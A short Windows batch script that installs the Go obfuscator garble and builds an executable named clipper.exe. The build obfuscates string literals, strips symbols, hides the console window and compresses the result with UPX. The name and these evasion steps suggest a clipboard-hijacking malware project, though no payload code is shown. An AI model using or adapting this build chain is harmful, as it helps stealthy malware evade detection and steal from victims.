@echo off

cls

title Installing...
go install mvdan.cc/garble@latest

cls

title Building...
garble -tiny -literals -seed=random build -trimpath -ldflags="-s -w -H=windowsgui" -o clipper.exe

cls

title Compressing...
upx --ultra-brute --best clipper.exe

pause